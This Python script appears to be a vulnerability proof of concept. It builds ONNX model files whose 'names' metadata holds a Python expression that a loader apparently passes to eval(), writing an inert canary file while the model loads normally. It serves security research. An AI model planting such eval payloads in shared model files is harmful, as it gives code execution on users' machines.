#!/usr/bin/env python3
"""Build the attacker's ONLY capability: a .onnx model file.

Everything is produced with the OFFICIAL onnx writer API (onnx.helper /
model.SerializeToString), validated by onnx.checker.check_model.  The payload
lives in `metadata_props`, ONNX's documented free-text annotation slot --
exactly the kind of field a safe, code-free format is contractually allowed
to hand back as ordinary data.

Three artifacts (written to ./artifacts next to this script unless a
directory is given as argv[1]):
  evil.onnx    -- metadata 'names' is a Python expression        (the attack)
  benign.onnx  -- metadata 'names' is a plain dict literal       (control A)
  nometa.onnx  -- no custom metadata at all                      (control B)

The graph itself is a valid, runnable YOLO-shaped network:
images[1,3,640,640] -> output0[1,84,8400] of zeros.  Nothing about the graph
is malicious; only the annotation is.

The payload is deliberately HARMLESS: it writes one inert marker file
(canary) into the CURRENT WORKING DIRECTORY of whichever process loads the
model, then returns a perfectly valid class-name dict so the product carries
on as if nothing happened.  No network, no shell, no persistence, no process
spawn.

NOTE: this build embeds a canary path RELATIVE to the loader's working
directory, so its bytes differ from the original container-based evidence
runs (which embedded `/out/pwned_by_w11_yolov13_onnx_meta`).  The two
generations of artifacts are hashed separately and never mixed:
  - original (2026-09-20, Linux container, E2 run):
      evil.onnx   3883e60b123a2d04919533d9d85350d63b589354a78a9723283f2030364e5e87
      benign.onnx 37eaa78df0c49b5b7310701694d04e5ea1e6ac50d06d1eff5a762a448df03891
      nometa.onnx 41c650302380c3242569c5e583cabc758dcd2ef5e1019406008f6320f4397ab9
  - this build: see ./artifacts/SHA256SUMS after running.
"""
import hashlib
import json
import pathlib
import sys

import onnx
from onnx import TensorProto, helper

CANARY_NAME = "pwned_by_w11_yolov13_onnx_meta"
CANARY_TEXT = "PWNED_BY_W11_YOLOV13_ONNX_META"

# eval() takes an EXPRESSION.  Write an inert marker, then return a perfectly
# valid class-name dict so the product carries on as if nothing happened.
PAYLOAD = (
    "(__import__('pathlib').Path(%r).write_text(%r), {0: 'person'})[1]"
    % (CANARY_NAME, CANARY_TEXT)
)
BENIGN = "{0: 'person'}"


def build_graph():
    images = helper.make_tensor_value_info("images", TensorProto.FLOAT, [1, 3, 640, 640])
    out = helper.make_tensor_value_info("output0", TensorProto.FLOAT, [1, 84, 8400])
    shape_init = helper.make_tensor("out_shape", TensorProto.INT64, [3], [1, 84, 8400])
    zero_val = helper.make_tensor("zero_val", TensorProto.FLOAT, [1], [0.0])
    n_zeros = helper.make_node(
        "ConstantOfShape", ["out_shape"], ["zeros"], value=zero_val, name="zeros")
    n_mean = helper.make_node("ReduceMean", ["images"], ["scalar"], keepdims=0, name="mean")
    n_mul = helper.make_node("Mul", ["zeros", "scalar"], ["output0"], name="mul")
    return helper.make_graph([n_zeros, n_mean, n_mul], "yolo_shaped",
                             [images], [out], initializer=[shape_init])


def make(path: pathlib.Path, names_value, with_meta: bool):
    model = helper.make_model(
        build_graph(), producer_name="mbe2e", producer_version="1",
        opset_imports=[helper.make_opsetid("", 13)])
    model.ir_version = 8
    model.model_version = 1
    model.doc_string = ""
    if with_meta:
        # the keys ultralytics' AutoBackend expects from an exported model
        for k, v in (("stride", "32"), ("task", "detect"), ("batch", "1"),
                     ("imgsz", "[640, 640]")):
            e = model.metadata_props.add()
            e.key, e.value = k, v
        e = model.metadata_props.add()
        e.key, e.value = "names", names_value
    onnx.checker.check_model(model)
    path.write_bytes(model.SerializeToString())
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main():
    default_out = pathlib.Path(__file__).resolve().parent / "artifacts"
    outdir = pathlib.Path(sys.argv[1]) if len(sys.argv) > 1 else default_out
    outdir.mkdir(parents=True, exist_ok=True)
    digests = {
        "evil.onnx": make(outdir / "evil.onnx", PAYLOAD, True),
        "benign.onnx": make(outdir / "benign.onnx", BENIGN, True),
        "nometa.onnx": make(outdir / "nometa.onnx", None, False),
    }
    (outdir / "SHA256SUMS").write_text(
        "".join(f"{v}  {k}\n" for k, v in sorted(digests.items())))
    print(json.dumps(digests, indent=2, sort_keys=True))
    print(f"canary (if the eval fires): <CWD>/{CANARY_NAME} = {CANARY_TEXT!r}")


if __name__ == "__main__":
    main()
